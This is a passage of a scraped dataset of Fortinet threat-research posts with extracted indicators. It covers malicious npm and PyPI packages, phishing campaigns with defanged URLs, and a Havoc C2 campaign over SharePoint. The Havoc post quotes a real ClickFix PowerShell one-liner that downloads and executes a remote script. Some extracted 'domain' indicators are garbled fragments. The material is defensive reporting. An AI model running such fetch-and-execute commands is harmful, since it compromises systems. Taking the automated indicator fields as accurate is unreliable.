A!trUserbridge-paypal_1.20.0:Bash/TommyBoy. A!truserrelationship-paypal_1.20.0:Bash/TommyBoy. A!tr The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Customers running current AntiVirus updates are protected. TheFortiGuard Web FilteringService detects and blocks the download URLs cited in this report as Malicious. TheFortiDevSecSCA scanner detects malicious packages, including those cited in this report that may operate as dependencies in users' projects in test phases, and prevents those dependencies from being introduced into users' products. If you believe these or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. Hash (sha256) bankingbundleserv_1.20.0 796deae716a6d66b49a99d00e541056babe34fd2fcbcea0380491de4b792afba Bash/TommyBoy. A!tr buttonfactoryserv-paypal_3.50.0 18e45358462363996688ceabfc098e17f855d73842f460b34c683e58c728149f Bash/TommyBoy. A!tr buttonfactoryserv-paypal_3.99.0 88bd580aa51129e4e5fa69e148131874c862015e7c51d59497e11f22db2d72c6 Bash/TommyBoy. A!tr tommyboytesting_1.0.1 23664decf3c2f28a3f552dc98d90017926617969713ccccdc9f5fd3178d76dbf Bash/TommyBoy. A!tr tommyboytesting_1.0.2 ba63fbf6f7bab000bc1b1bf92319415328cea238872450adbaac6a6069132779 Bash/TommyBoy. A!tr tommyboytesting_1.0.5 f359b687fb9e1a4c27fdf5174380abc9877f940ef6a6fd4d38e9ef40bb778107 Bash/TommyBoy. A!tr tommyboytesting_1.0.6 815ebfc4fb5bddf1f9ca1b12ae2a1b0e37736a93ea9babe858747096ad9ce671 Bash/TommyBoy. A!tr tommyboytesting_1.0.7 d21ae84e104a305b5aebee8e6fbb4837976ef26935dac90372637f913ef58154 Bash/TommyBoy. A!tr tommyboytesting_1.0.8 0c006540abcb768cad80a1a8ced926fa58f10cf9eb0be16c4185850df83bff82 Bash/TommyBoy. A!tr tommyboytesting_1.0.9 847e684a228292dc905205d7353ed9458e10129105fe3b387c4e9374d6afd783 Bash/TommyBoy. A!tr tommyboytesting_1.0.10 ed6a350c4b1baa6f098293c328d0a62d35aafb4ab62b93e6f3a611f06be9aa29 Bash/TommyBoy. A!tr tommyboytesting_1.0.11 123480357ab54d2c2067640105b5683445777ae1d20fd52551a5df9327692103 Bash/TommyBoy. A!tr tommyboytesting_1.0.12 3710742057e470e8882a84412721ed19652e3f13977af21a937bad27d75b6f96 Bash/TommyBoy. A!tr compliancereadserv-paypal_2.1.0 dd1a177126d48072381db98af74c964100c8ef2e43286f3a31114461251a164c Bash/TommyBoy. A!tr oauth2-paypal_0.6.0 0d8c5bb69c567e3949cc6e087610d79c886d9140d0eda88cc92d3ec63fb7a3b9 Bash/TommyBoy. A!tr oauth2-paypal_1.6.0 b6bc001bc9b4171a27fb2a485cb3e3d8f23bc1ee6b4a03bbcfbba63b7d208477 Bash/TommyBoy. A!tr oauth2-paypal_2.6.0 2c7bf841a659fa1d8105d26f6664ebc3a78b99e0c071eb7f529503346c40f778 Bash/TommyBoy. A!tr oauth2-paypal_4.8.0 cbbe1d5a7d4a721c61b9c3b8b6a8e5d65508f02c70e708698d8165d92e154383 Bash/TommyBoy. A!tr oauth2-paypal_7.5.0 25034c2542757ac93cb6008479a5bfc594f9e92f66249f6fb862447a18847ba7 Bash/TommyBoy. A!tr oauth2-paypal_10.0.0 148d3552db2acf469c84e26889336f06167c6cf455248e08d703282bc0556fb8 Bash/TommyBoy. A!tr oauth2-paypal_699.0.0 7186674c208242b8e6fdf7b0f4e7539218590618fee517aa264e8446247d3440 Bash/TommyBoy. A!tr Paymentapiplatformservice-paypal_1.20.0 7a48db17a02e94c97a329cc1a578777d8b4fb74221bdb22202369d6590917fd0 Bash/TommyBoy. A!tr Userbridge-paypal_1.20.0 7a48db17a02e94c97a329cc1a578777d8b4fb74221bdb22202369d6590917fd0 Bash/TommyBoy. A!tr userrelationship-paypal_1.20.0 ca7dc2b0856f89e71ce9da6f179b34c8879456b5dffda0b5bd3f0fd73bab1c50 Bash/TommyBoy. A!tr Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/malicious-npm-packages-targeting-paypal-users",
      "scraped_at": "2025-07-20T13:43:00.741083",
      "indicators": {
        "ip_address": [],
        "domain": [],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "23664decf3c2f28a3f552dc98d90017926617969713ccccdc9f5fd3178d76dbf",
          "7a48db17a02e94c97a329cc1a578777d8b4fb74221bdb22202369d6590917fd0",
          "123480357ab54d2c2067640105b5683445777ae1d20fd52551a5df9327692103",
          "dd1a177126d48072381db98af74c964100c8ef2e43286f3a31114461251a164c",
          "d21ae84e104a305b5aebee8e6fbb4837976ef26935dac90372637f913ef58154",
          "18e45358462363996688ceabfc098e17f855d73842f460b34c683e58c728149f",
          "2c7bf841a659fa1d8105d26f6664ebc3a78b99e0c071eb7f529503346c40f778",
          "815ebfc4fb5bddf1f9ca1b12ae2a1b0e37736a93ea9babe858747096ad9ce671",
          "ba63fbf6f7bab000bc1b1bf92319415328cea238872450adbaac6a6069132779",
          "3710742057e470e8882a84412721ed19652e3f13977af21a937bad27d75b6f96",
          "f359b687fb9e1a4c27fdf5174380abc9877f940ef6a6fd4d38e9ef40bb778107",
          "0c006540abcb768cad80a1a8ced926fa58f10cf9eb0be16c4185850df83bff82",
          "b6bc001bc9b4171a27fb2a485cb3e3d8f23bc1ee6b4a03bbcfbba63b7d208477",
          "88bd580aa51129e4e5fa69e148131874c862015e7c51d59497e11f22db2d72c6",
          "0d8c5bb69c567e3949cc6e087610d79c886d9140d0eda88cc92d3ec63fb7a3b9",
          "7186674c208242b8e6fdf7b0f4e7539218590618fee517aa264e8446247d3440",
          "cbbe1d5a7d4a721c61b9c3b8b6a8e5d65508f02c70e708698d8165d92e154383",
          "796deae716a6d66b49a99d00e541056babe34fd2fcbcea0380491de4b792afba",
          "25034c2542757ac93cb6008479a5bfc594f9e92f66249f6fb862447a18847ba7",
          "ed6a350c4b1baa6f098293c328d0a62d35aafb4ab62b93e6f3a611f06be9aa29",
          "148d3552db2acf469c84e26889336f06167c6cf455248e08d703282bc0556fb8",
          "847e684a228292dc905205d7353ed9458e10129105fe3b387c4e9374d6afd783",
          "ca7dc2b0856f89e71ce9da6f179b34c8879456b5dffda0b5bd3f0fd73bab1c50"
        ],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.8479532163742691
    }
  },
  {
    "id": "Fortinet_73208",
    "source": "Fortinet",
    "title": "Real-Time Anti-Phishing: Essential Defense Against Evolving Cyber Threats",
    "text": "FortiGuard Labs Threat Research Phishing remains one of the most prevalent cybersecurity threats worldwide, posing risks such as financial loss, data theft, reputational harm, and malware deployment. As phishing tactics grow more sophisticated, attackers are also expanding their targets across various platforms and services. The use of AI has further refined these techniques, making phishing attempts more deceptive and harder to detect. Attackers increasingly use personalized messages and convincing fake websites to evade traditional security measures, making detection more difficult for security teams. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. Organizations must strengthen their defenses to keep pace with the rapidly evolving threat landscape. While traditional defenses like email filters and blacklists can block known threats, they are less effective against emerging and AI-driven phishing attacks. Real-time anti-phishing (RTAP) solutions help address this challenge by using AI and machine learning to identify and mitigate both large-scale phishing campaigns and highly targeted spear-phishing attacks as they occur. According to the 2024 Verizon DBIR report, the median time for a user to fall prey to a phishing email is less than 60 seconds.[1] Over the past several weeks, threat data gathered by FortiGuard Labs reveals critical insights into the nature of phishing campaigns and the primary targets. These insights provide a snapshot of how cybercriminals are evolving their tactics to reach unsuspecting users. 1. Facebook is a Consistent Target: Our recent monitoring of phishing attacks has shown Facebook to a top target for phishing emails. Its widespread use and abundant personal information associated with accounts make it appealing to cybercriminals seeking to steal login credentials or exploit user data. Many phishing websites attempt to deceive users by claiming their account has been disabled or requires verification. 2. Roblox Targeting: In mid-February, a spike in phishing attempts targeted Roblox, a popular gaming platform among younger users. Phishing emails appeared disguised as account alerts or prize notifications, prompting victims to click on malicious links or provide sensitive or personal details. 3. Broad Targeting the End of January: The final days of January saw a broad range of platforms targeted by phishing attempts. These included: oTelegram:A widely used and encrypted messaging app.oIonos:A Germany-based email, hosting, and cloud services provider.oCoinbase:A popular cryptocurrency exchange.oPayPal:A worldwide used online payment system.oLazada:An e-commerce platform operating primarily in Southeast Asia.oiTrust:A cryptocurrency platform.oVkontakte:A Russian social media platform. FortiGuard Labs provides an advanced RTAP service as part of our FortiSandbox Advanced AI Subscription Bundle. This service provides comprehensive and proactive protection against phishing emails and other cyber threats. The RTAP solution built into FortiSandbox uses a variety of techniques to identify and block phishing emails, including: RTAP from FortiGuard Labs ensures that even previously unseen and unknown phishing attempts—which may not be recognized by traditional security systems—are detected and blocked. Human error remains one of the primary reasons phishing attacks succeed, making employee awareness and education essential for defense. Training staff to recognize and report phishing attempts can significantly reduce an organization’s risk. A well-informed workforce serves as the first line of defense against today’s increasingly sophisticated phishing tactics. The 2024 Verizon DBIR highlights this challenge, revealing that 68% of all breaches involved a non-malicious human factor—either through social engineering or unintentional mistakes.[1] Fortinet’sFortiPhishandFortiSATempower organizations to strengthen their human firewall. FortiPhish provides phishing simulation and awareness training, while FortiSAT provides critical security awareness training to create a cyber-aware workforce. Implementing these proactive training tools will enhance employee awareness, bolster technical defenses, and reduce the risk of successful phishing attacks. As phishing attacks grow more sophisticated, real-time, adaptive cybersecurity solutions are crucial for effective defense. FortiGuard’s advanced anti-phishing capabilities, powered by AI and machine learning, provide continuous protection by detecting and neutralizing new phishing techniques as they emerge. With RTAP’s real-time threat response, FortiGuard helps businesses and individuals safeguard their digital environments to reduce risk and stay ahead of cybercriminals. [facebook]case-id-10012125556[.]vercel[.]apppolicy-violation-10002321704[.]github[.]io [roblox]robux-generator---cpa[.]firebaseapp[.]comrbxodi[.]blogspot[.]com [telegram]www[.]telegramtgtg[.]comwww[.]91gsh[.]com [ionos]67a34b6bfc0d210a820d0cf5--brilliant-mermaid-bad0bd[.]netlify[.]appgworldhomes[.]com/ionos-ag/ionos-es/login/login[.]php [coinbase]000414-coinbase[.]comcoinbsphnnumbe[.]gitbook[.]io/us [paypal]paypalloginonline[.]blogspot[.]comniemalssoeder[.]de/c/index/myaccount [vkontakte]uncloabatles[.]ru/votes/7838610vim[.]vimeo18[.]ru/votes/3818905 [1]https://www.verizon.com/business/resources/infographics/2024-dbir-infographic.pdf FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/real-time-anti-phishing-essential-defense-against-evolving-cyber-threats",
      "scraped_at": "2025-07-20T13:43:08.398834",
      "indicators": {
        "ip_address": [],
        "domain": [
          "ww",
          "rovider",
          "latform",
          "pp",
          "024-dbir-infographic",
          "xchange",
          "ystem",
          "sia"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [],
        "cve": [],
        "email": [],
        "url": [
          "https://www.verizon.com/business/resources/infographics/2024"
        ]
      },
      "threat_score": 0.8625730994152049
    }
  },
  {
    "id": "Fortinet_48120",
    "source": "Fortinet",
    "title": "Fortinet Identifies Malicious Packages in the Wild: Insights and Trends from November 2024 Onward",
    "text": "FortiGuard Labs Threat Research FortiGuard Labs has analyzed malicious software packages detected from November 2024 to the present, identifying various techniques used to exploit system vulnerabilities. This analysis provides insights into the evolving threat landscape and emerging attack methods. FortiGuard Labs leverages our proprietary, AI-driven OSS malware detection system to track and examine these threats. By reviewing the tactics observed—such as low-file-count packages designed to evade detection, command overwrite techniques, and typosquatting—this report outlines key trends and their potential impact on system security. Since November 2024, Fortinet's automated threat detection platform has identified multiple malicious software packages, revealing various attack techniques used to exploit system vulnerabilities. These analyses show that attackers are employing methods such as obfuscation and install scripts to bypass traditional security measures. This report provides an overview of the identified threats and the techniques observed, reinforcing the importance of robust detection and security strategies in software environments. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. FortiGuard Labs' analysis has identified a range of techniques used by attackers to compromise systems, including both well-known and less common methods: While not necessarily malicious on its own,the majority of detected malicious packages (1,082) exhibit a low file count, often containing minimal code designed to evade detection while enabling exploits such as data theft, unauthorized access, or system compromise. Common indicators include command overwrites, where attackers modify installation commands to introduce malicious code or bypass security, suspicious behavior flagged by machine learning systems due to anomalous patterns, and obfuscation techniques like base64 encoding or encryption to conceal harmful payloads. These tactics combine to create lightweight, evasive threats that are challenging to detect but capable of significant damage. While not all install scripts are malicious, threat actors often use them to silently deploy harmful code during installation, sometimes bypassing security checks. These scripts can modify the standard installation process to execute harmful actions without the user’s knowledge. For example, an install script may include HTTP POST requests for data exfiltration, suspicious API calls like https.get or https.request to communicate with external servers, and hardcoded URLs, such as Discord webhooks, for receiving stolen data. These actions suggest the script is setting up a backdoor or preparing the system for further malicious activities, highlighting the need for careful scrutiny of installation scripts to detect and mitigate potential threats. Packages lacking a repository URL raise concerns about their legitimacy and transparency, as they often lack clear provenance or accountability, which is typical of malicious software. Without a public repository, verifying the source, tracking development, or assessing potential security issues is difficult. Malicious actors may avoid repositories to evade scrutiny and prevent code inspection, reducing the chances of detection. A missing repository URL, combined with other red flags like suspicious APIs or URLs, increases the likelihood that the package is designed for exploitation, data theft, or other malicious activities. Suspicious URLs are a key indicator of potentially malicious packages, as they are often used to download additional payloads or establish communication with command-and-control (C&C) servers, giving attackers control over infected systems. These URLs may appear legitimate, disguising their harmful intent to evade detection. Common tactics include using shortened or dynamic URLs, hosting malicious content on trusted platforms, or disguising payloads as safe files. In 974 packages, such URLs are linked to the risk of data exfiltration, further malware downloads, and other malicious actions. It is crucial to scrutinize and monitor external URLs in package dependencies to prevent exploitation. While essential for software functionality, APIs can be weaponized by malicious actors to perform harmful activities. In 681 detected cases, suspicious APIs like https.get and https.request were used to exfiltrate data, enable command-and-control (C&C) communication, or obscure malicious intent. These APIs may send sensitive information to remote servers or allow remote control of compromised systems. In one example, the use of https.get and https.request in index.js suggests data exfiltration or communication with external sources, a common tactic in malware. Combined with other red flags, such as suspicious URLs, these API calls indicate the potential for malicious or compromised projects. Recently discovered malicious Python packages AffineQuant-99.6, amzn-aws-glue-ml-libs-python-6.1.5, and amzn-awsglue-6.1.4, exploit the setup.py file to silently collect system information, including the MAC address, hostname, username, and current directory, and sends this data to remote servers controlled by the attacker. The script uses system commands (getmac for Windows, ifconfig for Linux/macOS) to retrieve the MAC address, base64-encoded it, and send it to hidden URLs. A custom installation process using setuptools to override the installation routine ensures the malicious payload runs after the package is installed. This type of attack has been identified in multiple packages and highlights the risk developers face when installing packages from untrusted sources—potentially leading to stolen credentials, system data, and further attacks. To protect themselves, developers should install packages only from trusted sources, review package content before installation, use virtual environments to isolate installs, scan for vulnerabilities with security tools, and keep dependencies up to date. A malicious script (seller-admin-common_6.5.8, seller-rn-mng-lib_6.5.8. ) is designed to secretly collect sensitive information from a victim’s machine and send it to an external server via a Discord webhook. Upon execution, the script retrieves the internal IP address of the victim’s machine and fetches the external IP address by making an HTTPS request to an online API. It also gathers system details, such as the hostname, username, DNS servers, home directory, and application information. This collected data is then bundled into a JSON object and sent to the attacker’s server, where it can be accessed for further malicious purposes. The combination of internal and external IP addresses, DNS settings, and user details makes the attack highly invasive, enabling attackers to track the victim’s machine and potentially exploit the information for further attacks. Using a Discord webhook adds a layer of stealth, allowing the attacker to collect the stolen data without raising suspicion, making this type of data harvesting ideal for gathering intelligence or executing more targeted cyberattacks. A recently identified malicious JavaScript code found in the package xeno.dll_1.0.2 utilizes obfuscation techniques to disguise its true intentions. Upon installation, it logs keystrokes to capture private information such as passwords and credit card details, which are then encrypted and sent to a remote server controlled by the attacker. Additionally, the script installs a backdoor that provides remote access with elevated privileges, giving the attacker full control of the system. The backdoor also collects system-specific data, such as the operating system version, installed applications, and network configuration, and sends it to the attacker’s server for future exploitation. Disguised as a legitimate service, the attacker’s server makes the malicious activity harder to detect. This stealthy combination of keylogging and remote access allows the attacker to steal sensitive data and conduct further attacks, posing a significant threat to the victim's privacy and system integrity. The data from FortiGuard Labs’ analysis reveals a diverse array of malicious packages, showcasing the wide range of tactics used by cybercriminals. From simple low-file-count packages to complex, multi-layered attacks that involve combining files, network code, and process execution, attackers are leveraging increasingly sophisticated methods to breach systems. As cybersecurity threats evolve, it’s crucial for organizations and individuals to stay informed about the latest threats. Proactive defense measures such as regular system updates, advanced threat detection, and user education on identifying suspicious activity are essential in mitigating these growing risks. Stay vigilant and protect your systems from these emerging threats. FortiGuard AntiVirusdetects the malicious files identified in this report as: AffineQuant-99.6/main.py : Python/Agent. EBC2!traffineQuant-99.6: Python/Agent. EBC2!tramzn-aws-glue-ml-libs-python-6.1.5/setup.py: Python/Agent. D31D!tramzn-aws-glue-ml-libs-python-6.1.5:Python/Agent. D31D!tramzn-awsglue-6.1.4/setup.py: Python/Agent.8960!trAmzn-awsglue-6.1.4: Python/Agent.8960!trseller-admin-common_6.5.8/index.js: JS/Agent.409D!trSeller-admin-common_6.5.8: JS/Agent.409D!trseller-rn-mng-lib_6.5.8/index.js: JS/Agent.409D!trSeller-rn-mng-lib_6.5.8: JS/Agent.409D!trxeno.dll_1.0.2/index.js: JS/Agent. B3EF!trXeno.dll_1.0.2: JS/Agent. B3EF!tr The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Customers running current AntiVirus updates are protected. TheFortiGuard Web FilteringService detects and blocks the download URLs cited in this report as Malicious. TheFortiDevSecSCA scanner detects malicious packages, including those cited in this report that may operate as dependencies in users' projects in test phases, and prevents those dependencies from being introduced into users' products. If you believe these or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. Package/file name affineQuant-99.6/main.py a7ba9a1eef84ae8dad8ed328c41fe4346df402a003ff7cef5e7cbd592c29f4de Python/Agent. EBC2!tr affineQuant-99.6 8fe3eee65782c61111354a0a2a58da04901c7b416d3b7634aa605e1939dde531 Python/Agent. EBC2!tr amzn-aws-glue-ml-libs-python-6.1.5/setup.py 2420fa98a183da4153e4de00e401efa19c62fe9ed631d980315b0b719221aec4 Python/Agent. D31D!tr amzn-aws-glue-ml-libs-python-6.1.5 05e9226714f29fbe526820d35c8011f86297444ec581d16d60b38bb55b20fa91 Python/Agent. D31D!tr amzn-awsglue-6.1.4/setup.py ba0ac1985fb931110899402ce44f11c5d75161cb69ff3d0e9357000ef631a2e1 Python/Agent.8960!tr amzn-awsglue-6.1.4 351bd6e977884f050bdb348239cfd20e0cc9b9a7a6aa3b3aa21e3bed0b072afe Python/Agent.8960!tr seller-admin-common_6.5.8/index.js 3fe14fc83121fdc05efdcc0c1c4d532ca501644a952399b27a6e1bdd6cfed2b7 JS/Agent.409D!tr seller-admin-common_6.5.8 3fe14fc83121fdc05efdcc0c1c4d532ca501644a952399b27a6e1bdd6cfed2b7 JS/Agent.409D!tr seller-rn-mng-lib_6.5.8/index.js 920da0917dbf7ead5531406b324de83656c90a39176f5377c123fe36d257668b JS/Agent.409D!tr seller-rn-mng-lib_6.5.8 673db52c28aac71f8cf80ee1718b8ea98e1f8e0b3f1293da15fd26c4e6343927 JS/Agent.409D!tr xeno.dll_1.0.2/index.js 6a68848e118ec280d01a1dc989e8d67ca10b3f14aab98eb87a23b340c863fdcf JS/Agent. B3EF!tr xeno.dll_1.0.2 973a87cc0baa17c53a17467e188d82241458f7ff1e70e920014eaf2bacbe3a07 JS/Agent. B3EF!tr FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/fortinet-identifies-malicious-packages-in-the-wild-insights-and-trends",
      "scraped_at": "2025-07-20T13:43:16.535002",
      "indicators": {
        "ip_address": [],
        "domain": [
          "ndex",
          "etup",
          "ttps",
          "ain"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "351bd6e977884f050bdb348239cfd20e0cc9b9a7a6aa3b3aa21e3bed0b072afe",
          "ba0ac1985fb931110899402ce44f11c5d75161cb69ff3d0e9357000ef631a2e1",
          "2420fa98a183da4153e4de00e401efa19c62fe9ed631d980315b0b719221aec4",
          "6a68848e118ec280d01a1dc989e8d67ca10b3f14aab98eb87a23b340c863fdcf",
          "8fe3eee65782c61111354a0a2a58da04901c7b416d3b7634aa605e1939dde531",
          "a7ba9a1eef84ae8dad8ed328c41fe4346df402a003ff7cef5e7cbd592c29f4de",
          "973a87cc0baa17c53a17467e188d82241458f7ff1e70e920014eaf2bacbe3a07",
          "920da0917dbf7ead5531406b324de83656c90a39176f5377c123fe36d257668b",
          "3fe14fc83121fdc05efdcc0c1c4d532ca501644a952399b27a6e1bdd6cfed2b7",
          "673db52c28aac71f8cf80ee1718b8ea98e1f8e0b3f1293da15fd26c4e6343927",
          "05e9226714f29fbe526820d35c8011f86297444ec581d16d60b38bb55b20fa91"
        ],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.4982456140350877
    }
  },
  {
    "id": "Fortinet_64096",
    "source": "Fortinet",
    "title": "Havoc: SharePoint with Microsoft Graph API turns into FUD C2",
    "text": "FortiGuard Labs Threat Research Affected platforms:Microsoft WindowsImpacted parties:Any organizationImpact:Attackers gain control of the infected systemsSeverity level:High Havoc is a powerful command-and-control (C2) framework. Like other well-known C2 frameworks, such asCobalt Strike,Silver, andWinos4.0, Havoc has been used inthreat campaignsto gain full control over the target. Additionally, It is open-source and available on GitHub, making it easier for threat actors to modify it to evade detection. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. FortiGuard Labs recently discovered a phishing campaign that combines ClickFix and multi-stage malware to deploy a modified Havoc Demon Agent. The threat actor hides each malware stage behind a SharePoint site and uses a modified version of Havoc Demon in conjunction with the Microsoft Graph API to obscure C2 communications within trusted, well-known services. Figure 1 shows the attack chain. The attack campaign starts with a phishing email containing an HTML file as an attachment, as illustrated in Figure 2. It uses a brief explanation and an urgent tone to prompt the recipient to open the attachment immediately. The attachment, “Documents.html,” is a ClickFix attack that embeds a fake error message and instructions in HTML to deceive users into copying and pasting a malicious PowerShell command into their terminal or PowerShell, ultimately executing malicious code. Decoding the base64-encoded string shown in Figure 3 reveals a PowerShell command that downloads and executes a remote PowerShell script. powershell -w h -c \"iwr ‘hxxps://hao771[.]sharepoint.com/_layouts/15/download.aspx?share=EU7smZuKo-pDixZ26BSAaX0BVVcF5VkOc7qEvjsDSAH9OQ'|iex\" The Script file is hosted in SharePoint and controlled by the threat actor. When the script runs, it checks whether the execution environment is a sandbox by verifying the number of domain computers. It then deletes all registry entries under HKCU:\\Software\\Microsoft with names starting with \"zr_\" and adds the specified property as an infection marker, as shown in Figure 4. Next, the script verifies the existence of pythonw.exe. If it’s not found, it downloads the Python interpreter. Otherwise, it directly runs the Python script. Finally, the remote Python script is retrieved and executed in hidden windows to obscure malicious activity, as shown in Figure 5. Like the PowerShell script, the Python script is hosted on the same SharePoint. It contains debug information written in Russian and serves as a shellcode loader. We executed the script directly with the Python interpreter in the terminal. The log displays “Выделение памяти” (memory allocation), \"Запись в память” (write to memory), \"Выполнение shellcode” (execution of shellcode), and \" Завершение выполнения скрипта” (script execution completion) in sequence, indicating successful shellcode execution, as seen in Figure 6. KaynLdr is a Github Shellcode Loader designed to reflectively load an embedded DLL. It complicates analysis by using API hashing with a modified DJB2 algorithm and leverages resolved ntdll APIs for memory allocation and mapping. The instruction “call rax” executes the embedded DLL's entry point, as shown in Figure 7. Havoc is an open-source post-exploitation command and control framework used in red teaming exercises andattack campaignsto gain complete control over compromised targets. In this attack campaign, we observed that the threat actor uses Havoc in conjunction with the Microsoft Graph API to conceal C2 communication within well-known services. The modified Havoc Demon DLL still starts with DemonInit and uses the same hash algorithm as KaynLdr to retrieve the necessary APIs and initialize the configuration objects. The second function, “SharePointC2Init,” initializes files on the actors' SharePoint site using the Microsoft Graph API. It first combines the hardcoded shared secret with the necessary parameters for a POST request. It then sends the request to the /token endpoint of the Microsoft Identity Platform to obtain access tokens for Microsoft Graph APIs. Next, it utilizes the obtained token to create two files in SharePoint's default document library by making a PUT request, as shown in Figure 10. The Havoc AgentID generates the VictimID as a filename, concatenated with the suffix “pD9-tKout/pD9-tKin” to indicate their purpose. The initial packet sent to C2 is a CheckIn request containing data gathered from the DemonMetaData function. In this step, the victim's information—such as Host Name, User Name, Domain Name, IP Address, Process Details, OS Information, whether the user has an elevated account, and the configuration in the Demon DLL—is sent to the C2 server. All content is encrypted using the AES-256 algorithm in CTR mode with a randomly generated 256-bit key and a 128-bit IV. Finally, it is combined with the header, as illustrated in Figure 11, before being sent to the C2 server via the TransportSend function. The TransportSend function has been modified to communicate with the C2 by accessing two files: {VictimID}pD9-tKout and {VictimID}pD9-tKin. It updates the request to the “{VictimID}pD9-tKout” file and then retrieves the response from the C2 by using Microsoft Graph API with the GET method to access the contents of the ‘{VictimID}pD9-tKin’ file. If the response is successfully retrieved, the content of file '{VictimID}pD9-tKin' is immediately erased. Next, the content in the response is compared with the AgentID. If they match, the session.connected flag is set, and it enters the dispatcher routine to await new tasks from the attacker. In the dispatcher routine, the agent sends a 'Get Job' request and parses the response into Command ID, Request ID, and task. Although we only observed DEMON_COMMAND_NO_JOB (Command ID: 0xA) during our analysis, as shown in below, we found that the task would be decrypted and executed if a different command ID exists and is not 0xA in the program. The supported commands are the same as those in Havoc Github, as shown in Figure 14. They include gathering information about the target, file operations, command and payload execution, token manipulation, and Kerberos Attacks. In addition to staying alert for phishing emails, guided messages that encourage opening a terminal or PowerShell must be handled with extra caution to prevent inadvertently downloading and executing malicious commands. In this article, we uncovered the execution flow and the altered open-source post-exploitation framework used in this attack. Public services once again play a crucial role in the attack campaign, now further integrated with modified Havoc Demon to hide malicious communication within the Microsoft Graph API, making identification and detection even more challenging. The malware described in this report are detected and blocked byFortiGuard Antivirusas: HTML/Agent. A5D4!trPowerShell/MalwThreat!ebc5FTPython/Agent. DF60!trW64/Havoc. L!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard Antivirus Service. The FortiGuard antivirus engine is part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected. TheFortiGuard CDR(content disarm and reconstruction) service can disarm the malicious macros within the document. FortiGuard Labs provides theBackdoor. Havoc. AgentIPS signature to block Havoc C2 network communications. We also suggest that organizations take the free FortinetFortinet Certified Fundamentals (FCF)cybersecurity training. The training is designed to help users learn about today's threat landscape and introduces basic cybersecurity concepts and technology. FortiGuard IP ReputationandAnti-Botnet Security Serviceproactively block malware attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact the GlobalFortiGuard Incident Response Team. hao771[.]sharepoint.com 51796effe230d9eca8ec33eb17de9c27e9e96ab52e788e3a9965528be2902330989f58c86343704f143c0d9e16893fad98843b932740b113e8b2f8376859d2ddA5210aaa9eb51e866d9c2ef17f55c0526732eacb1a412b910394b6b51246b7dacc151456cf7df7ff43113e5f82c4ce89434ab40e68cd6fb362e4ae4f70ce65b3 FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/havoc-sharepoint-with-microsoft-graph-api-turns-into-fud-c2",
      "scraped_at": "2025-07-20T13:43:23.485164",
      "indicators": {
        "ip_address": [],
        "domain": [
          "ession",
          "ythonw",
          "ownload",
          "ocuments",
          "harepoint"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.36124794745484406
    }
  },
  {
    "id": "Fortinet_58962",
    "source": "Fortinet",
    "title": "Winos 4.0 Spreads via Impersonation of Official Email to Target Users in Taiwan",
    "text": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:The stolen information can be used for future attackSeverity Level:High In January 2025, FortiGuard Labs observed an attack that used Winos4.0, an advanced malware framework actively used in recent threat campaigns, to target companies in Taiwan. Figure 1 shows an example of the attack chain. Usually, there is a loader that is only used to load the malicious DLL file, and the Winos4.0 module is extracted from the shellcode downloaded from its C2 server. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. According to a report released in November 2024, Winos4.0 was distributed through gaming-related applications, however, it spread via an email masquerading as from Taiwan's National Taxation Bureau in the campaign in January 2025. The sender claimed that the malicious file attached was a list of enterprises scheduled for tax inspection and asked the receiver to forward the information to their company's treasurer. The attachment also masquerades as an official document from the Ministry of Finance. It asks the victim to download the attached list of enterprises slated for tax inspection. However, the list is a ZIP file containing malicious DLL for the next attack stage. The files in the ZIP file are executed in the following sequence: 20250109.exe, ApowerREC.exe, and lastbld2Base.dll. 20250109.exe is a launcher originally used to execute the actual APowerREC.exe in ./app/ProgramFiles. The attacker created the same folder structure in the ZIP file and used a loader to replace ApowerREC.exe. The fake ApowerREC.exe does nothing but call a function imported from lastbld2Base.dll. When an executable file is run, it loads all necessary DLL files and executes their entry functions. As a result, the DLLMain function of lastbld2Base.dll, where the malicious code is located, is loaded when the fake ApowerREC.exe is executed. Lastbld2Base.dll decrypts its data to get the shellcode for the next stage. At the bottom of the shellcode are configurations, including the IP address of the C2 server, the name of the base registry key for the next stage, and flags for features for the current stage. The optional features include permission evaluation, hiding the window of the current process, and anti-sandbox functions. If higher permission is needed in this attack, it tests the current permissions by opening the registry key 